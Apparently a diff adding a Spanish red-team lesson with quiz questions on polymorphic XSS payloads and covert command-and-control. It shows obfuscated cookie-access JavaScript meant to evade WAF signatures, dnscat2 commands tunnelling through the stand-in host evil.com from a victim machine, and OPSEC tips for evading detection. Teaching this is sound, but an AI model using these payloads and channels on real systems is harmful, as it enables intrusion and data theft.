@@ -1,0 +1,78 @@
+---
+index: 2
+title: "Payloads polimórficos y C2 web"
+questions:
+  - id: web-red-team-t02-q01
+    prompt: "¿Qué es un payload polimórfico?"
+    hint: "Cambia su forma en cada ejecución manteniendo la funcionalidad."
+    kind: text
+  - id: web-red-team-t02-q02
+    prompt: "¿Qué protocolo de C2 se camufla dentro de tráfico HTTP legítimo?"
+    hint: "Cobalt Strike / Metasploit usan HTTP/S como transporte."
+    kind: text
+  - id: web-red-team-t02-q03
+    prompt: "¿Qué herramienta crea túneles encubiertos dentro de tráfico legítimo (DNS, ICMP)?"
+    hint: "dnscat2, iodine (DNS); icmpsh (ICMP)."
+    kind: choice
+    options:
+      - id: a
+        label: "Nmap"
+      - id: b
+        label: "dnscat2/iodine (DNS tunneling) e icmpsh (ICMP tunneling)"
+      - id: c
+        label: "Burp Suite"
+      - id: d
+        label: "sqlmap"
+---
+
+## Payloads polimórficos: el camaleón
+
+Un payload polimórfico cambia su representación en CADA ejecución sin cambiar qué
+hace. Para JavaScript (XSS):
+
+```javascript
+// Original (detectado por firmas):
+document.cookie
+
+// Polimórfico (equivalente, distinta forma):
+// Opción 1: string concatenation
+document['cook'+'ie']
+
+// Opción 2: eval con hex
+eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,99,111,111,107,105,101))
+
+// Opción 3: self-referencing
+window[document.URL.split('/').pop().substring(0,8)]
+
+// Opción 4: time-based (solo ejecuta tras un delay, evita sandbox de WAF)
+setTimeout(()=>document.cookie, 3000)
+```
+
+El WAF busca patrones (`document.cookie`, `alert(`) — el polimorfismo los rompe.
+
+## C2: command & control camuflado
+
+El C2 (Command and Control) es el canal por donde el atacante controla la máquina
+comprometida. En red teaming, debe parecer tráfico LEGÍTIMO:
+
+| Técnica | Cómo funciona | Detección |
+|---|---|---|
+| **HTTP beacons** | La shell "llama a casa" via GET/POST a un dominio que parece normal | inspecting User-Agent, timing patterns |
+| **DNS tunneling** | Los comandos viajan codificados en subdominios (`cmd.evil.com` → respuesta DNS contiene datos) | anomalías en volumen de DNS queries |
+| **ICMP tunneling** | Datos en el payload de pings | payload ICMP > 32 bytes |
+| **Domain fronting** | Conectar a un CDN legítimo (cloudfront.net) con un SNI diferente | TLS inspection |
+
+```bash
+# DNS tunneling con dnscat2 (servidor):
+dnscat2-server evil.com
+# En la víctima:
+dnscat2 --dns server=8.8.8.8,domain=evil.com
+```
+
+## Operational Security (OPSEC) del red teamer
+
+1. **Jitter**: nunca hagas beacons en intervalos exactos (300s ± 60s aleatorio)
+2. **User-Agent rotativo**: cambia entre Chrome/Firefox/curl según el entorno
+3. **Domain aging**: registra dominios meses antes del engagement
+4. **Kill dates**: todos los implantes con fecha de expiración automática
+5. **Egress filtering awareness**: el SOC sabe qué sale — imita el patrón normal
